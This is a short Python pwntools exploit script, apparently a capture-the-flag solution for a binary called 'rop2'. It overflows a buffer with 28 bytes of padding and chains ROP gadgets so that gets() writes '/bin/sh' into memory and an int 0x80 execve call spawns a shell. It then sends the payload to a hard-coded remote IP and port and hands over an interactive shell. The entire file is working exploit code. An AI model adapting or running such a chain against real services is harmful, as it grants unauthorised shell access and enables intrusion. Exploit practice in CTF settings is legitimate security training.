from pwn import *

#sock = process("./rop2")
sock = process(['/usr/bin/nc', '45.122.249.68', '10006'])

pop_eax_edx_ebx = 0x08056334
pop_edx_ecx_ebx = 0x0806ee91
int80 = 0x08049563
addr_gets = 0x08050120
binsh = 0x080d86e0

#add padding
payload = 'a' * 28
#write '/bin/sh' to binsh by gets() function
payload += p32(addr_gets)
payload += p32(pop_eax_edx_ebx)
payload += p32(binsh)
payload += p32(0)
payload += p32(0)

#system call execve("/bin/sh",NULL,NULL) 
payload += p32(pop_eax_edx_ebx)
payload += p32(0xb)
payload += p32(0)
payload += p32(0)
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(int80)
payload += "\n/bin/sh"
#print(payload)
sock.sendline(payload)
sock.interactive()